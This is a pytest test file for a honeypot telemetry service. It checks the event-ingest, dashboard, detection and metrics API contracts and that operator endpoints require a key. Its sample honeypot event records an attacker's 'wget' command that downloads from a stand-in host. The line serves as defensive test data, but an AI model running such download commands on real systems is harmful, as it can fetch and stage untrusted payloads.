from __future__ import annotations

import pytest

from aegis_nexus.app import create_app

OPERATOR = {"X-Aegis-Operator-Key": "operator-secret"}
SENSOR = {"X-Aegis-Key": "sensor-secret"}
_EVENT = {
    "honeypot": "ssh-1",
    "event_type": "command",
    "observed": {"source_ip": "203.0.113.5", "service": "ssh", "protocol": "tcp",
                 "destination_port": 22, "command": "wget http://example.invalid/x"},
}


@pytest.fixture()
def client(tmp_path):
    app = create_app({
        "TESTING": True,
        "DATABASE_PATH": str(tmp_path / "aegis.db"),
        "INGEST_API_KEY": "sensor-secret",
        "OPERATOR_API_KEY": "operator-secret",
    })
    c = app.test_client()
    c.post("/api/v1/events", headers=SENSOR, json=_EVENT)
    return c


def _assert_keys(payload, keys):
    missing = [k for k in keys if k not in payload]
    assert missing == [], f"missing keys {missing} in {sorted(payload)}"


def test_ingest_contract(tmp_path):
    app = create_app({"TESTING": True, "DATABASE_PATH": str(tmp_path / "a.db"), "INGEST_API_KEY": "sensor-secret"})
    res = app.test_client().post("/api/v1/events", headers=SENSOR, json=_EVENT)
    assert res.status_code == 201
    _assert_keys(res.get_json(), ["id", "session_id"])


def test_dashboard_contract(client):
    body = client.get("/api/v1/dashboard", headers=OPERATOR).get_json()
    _assert_keys(body, ["totals", "data_quality", "map_points", "severity", "country", "timeline"])
    _assert_keys(body["totals"], ["events", "unique_source_ip", "sessions", "critical"])


def test_operations_status_contract(client):
    body = client.get("/api/v1/operations/status", headers=OPERATOR).get_json()
    _assert_keys(body, ["collector", "telemetry", "counters"])
    _assert_keys(body["collector"], ["ready", "state", "database_schema", "storage"])


def test_geo_and_detection_contracts(client):
    geo = client.get("/api/v1/geo/attacks", headers=OPERATOR).get_json()
    _assert_keys(geo, ["points", "unmapped", "provenance", "point_cap", "caveat"])
    coverage = client.get("/api/v1/detections/coverage", headers=OPERATOR).get_json()
    _assert_keys(coverage, ["techniques", "unmapped_rules", "caveat"])
    stats = client.get("/api/v1/detections/stats", headers=OPERATOR).get_json()
    _assert_keys(stats, ["rules", "caveat"])


def test_metrics_contract(client):
    res = client.get("/api/v1/metrics", headers=OPERATOR)
    assert res.mimetype == "text/plain"
    assert "aegis_platform_state" in res.get_data(as_text=True)


def test_operator_endpoints_fail_closed_without_key(tmp_path):
    app = create_app({
        "TESTING": True, "DATABASE_PATH": str(tmp_path / "a.db"),
        "INGEST_API_KEY": "sensor-secret", "OPERATOR_API_KEY": "operator-secret",
    })
    c = app.test_client()
    for path in ("/api/v1/dashboard", "/api/v1/operations/status", "/api/v1/metrics",
                 "/api/v1/geo/attacks", "/api/v1/alerts", "/api/v1/cases", "/api/v1/audit"):
        assert c.get(path).status_code == 401, f"{path} must require operator auth"
